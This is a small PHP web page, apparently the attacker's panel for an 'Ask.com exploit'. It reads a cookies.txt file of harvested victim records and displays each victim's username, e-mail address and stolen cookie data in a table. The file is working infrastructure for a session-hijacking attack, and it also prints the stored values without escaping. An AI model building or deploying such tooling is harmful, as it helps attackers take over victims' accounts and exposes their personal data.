<html>
<head>
    <title>Users who have clicked on the Ask.com exploit</title>
</head>
<body>
    <table>
        <tr>
            <th>Username</th>
            <th>E-mail</th>
            <th>Cookie info</th>
        </tr>
<?php
$cookie_file = "cookies.txt";
$cookie_handle = fopen($cookie_file, "r");

//$contents = fread($cookie_handle, 1000);
//echo $contents;

while($username = fgets($cookie_handle)) {
    $email = fgets($cookie_handle);
    $cookies = fgets($cookie_handle);
    $empty = fgets($cookie_handle);

echo <<<END
<tr>
<td>$username</td>
<td>$email</td>
<td>$cookies</td>
</tr>
END;
}

fclose($cookie_handle);

?>
    </table>
</body>
</html>